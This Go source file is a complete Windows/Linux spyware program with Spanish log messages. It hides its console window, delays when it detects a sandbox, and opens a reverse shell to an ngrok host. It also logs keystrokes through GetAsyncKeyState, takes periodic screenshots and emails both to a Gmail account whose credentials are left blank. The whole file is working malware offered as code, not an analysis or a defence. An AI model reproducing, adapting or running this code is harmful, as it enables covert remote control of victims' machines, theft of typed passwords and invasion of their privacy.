package main
import (
	"bytes"
	"encoding/base64"
	"fmt"
	"image/png"
	"io"
	"log"
	"net"
	"net/smtp"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"syscall"
	"time"

	"github.com/kbinani/screenshot"
)

var user32 = syscall.NewLazyDLL("user32.dll")
var procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
var lastScreenshotFileName string

func main() {
    for {
        if SANDIEE() {
            time.Sleep(3 * time.Minute)
        } else {
            go THELAGETO()
            go GETKEYS()
            break 
        }
    }
    select {}
}

func hideWindow() {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	handle, _, _ := kernel32.NewProc("GetConsoleWindow").Call()
	user32.NewProc("ShowWindow").Call(handle, 0)
}

func SANDIEE() (valor bool){
	counter := 0
	numCPU := runtime.NumCPU()
	_, err := os.ReadFile("/proc/self/cgroup")
	if err !=nil{
		valor = false
	}else{
		counter++
	}
	if numCPU <=3{
		counter++
	}
	if _, err := os.ReadFile("/sys/class/dmi/id/board_vendor"); err == nil {
        counter++
    }
	if counter>=3{
		valor = true
	}

	return 
}




func JAZZCHIZ() {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		log.Println("No se detectaron monitores.")
		return
	}
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			log.Printf("Error capturando la pantalla del monitor #%d: %v\n", i, err)
			continue
		}
		fileName := fmt.Sprintf("captura_%d_%dx%d.png", i, bounds.Dx(), bounds.Dy())
		file, err := os.Create(fileName)  
		if err != nil {
			log.Printf("Error creando el archivo %s: %v\n", fileName, err)
			continue
		}
		if err := png.Encode(file, img); err != nil { 
			log.Printf("Error guardando la imagen en %s: %v\n", fileName, err)
			file.Close()  
			continue
		}
		fmt.Printf("Captura del monitor #%d guardada en \"%s\"\n", i, fileName)
		lastScreenshotFileName = fileName
		
	}
}



func THELAGETO() {
	hideWindow()
	for {
		puertita, err := net.Dial("tcp", "0.tcp.sa.ngrok.io:19926 ")
		if err != nil {
			time.Sleep(5 * time.Second)
			log.Println(err)
			continue
		}

		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd.exe")
		} else {
			cmd = exec.Command("/bin/bash")
		}
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Stdin = puertita
		cmd.Stdout = puertita
		cmd.Stderr = puertita

		if err := cmd.Run(); err != nil {
			log.Println("Error ejecutando comando:", err)
			return
		}

		time.Sleep(1 * time.Second)
	}
}


func GETKEYS() {
	var keystrokes string
	keystrokeCount := 0
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()
	go func() {
		for range ticker.C {
			JAZZCHIZ()
			if keystrokeCount > 0 {
				SendKekos(keystrokes)
				keystrokes = ""
				keystrokeCount = 0
			}
		}
	}()

	for {
		for i := 8; i <= 255; i++ {
			keyState,_,_  := procGetAsyncKeyState.Call(uintptr(i))
			if keyState&0x0001 != 0 {
				if i == 8 && len(keystrokes) > 0 { 
					keystrokes = keystrokes[:len(keystrokes)-1] 
					keystrokeCount--
				} else {
					keystrokes += keyToString(i)
					keystrokeCount++
				}
			}
		}
		time.Sleep(100 * time.Millisecond)
	}
}
func keyToString(keyCode int) string {
	if keyCode >= 48 && keyCode <= 57 {
		return string(rune(keyCode))
	}
	if keyCode >= 65 && keyCode <= 90 {
		return string(rune(keyCode))
	}

	switch keyCode {
	case 13:
		return "\n"
	case 32:
		return " "
	default:
		return ""
	}
}
func SendKekos(keystrokes string) {
	smtpserver := "smtp.gmail.com:587"
	email := ""
	password := ""
	user, err := user.Current()
	if err != nil {
		log.Println("Error obteniendo usuario:", err)
		return
	}
	auth := smtp.PlainAuth("", email, password, "smtp.gmail.com")
	subject := "Teclas capturadas de " + user.Username
	from := email
	to := email
	var buf bytes.Buffer
	boundary := "my-boundary-12345"
	buf.WriteString("MIME-Version: 1.0\r\n")
	buf.WriteString("Content-Type: multipart/mixed; boundary=" + boundary + "\r\n")
	buf.WriteString("Subject: " + subject + "\r\n")
	buf.WriteString("From: " + from + "\r\n")
	buf.WriteString("To: " + to + "\r\n\r\n")
	buf.WriteString("--" + boundary + "\r\n")
	buf.WriteString("Content-Type: text/plain; charset=\"UTF-8\"\r\n\r\n")
	buf.WriteString("Pulsaciones de teclas:\r\n" + keystrokes + "\r\n\r\n")
	if lastScreenshotFileName != "" {
		file, err := os.Open(lastScreenshotFileName)
		if err != nil {
			log.Println("Error abriendo la imagen:", err)
			return
		}
		defer file.Close()
		fileData, err := io.ReadAll(file)
		if err != nil {
			log.Println("Error leyendo la imagen:", err)
			return
		}
		encoded := base64.StdEncoding.EncodeToString(fileData)
		buf.WriteString("--" + boundary + "\r\n")
		buf.WriteString("Content-Type: image/png\r\n")
		buf.WriteString("Content-Transfer-Encoding: base64\r\n")
		buf.WriteString("Content-Disposition: attachment; filename=\"" + lastScreenshotFileName + "\"\r\n\r\n")
		const maxLineLength = 76
		for i := 0; i < len(encoded); i += maxLineLength {
			end := i + maxLineLength
			if end > len(encoded) {
				end = len(encoded)
			}
			buf.WriteString(encoded[i:end] + "\r\n")
		}
	}
	buf.WriteString("--" + boundary + "--\r\n")

	err = smtp.SendMail(smtpserver, auth, from, []string{to}, buf.Bytes())
	if err != nil {
		log.Println("Error enviando correo:", err)
	} else {
		log.Println("Correo enviado correctamente.")
	}
	time.Sleep(5*time.Second)
	if err := os.Remove(lastScreenshotFileName);err !=nil{
		fmt.Println("No se pudo borrar la foto",err)
	}
}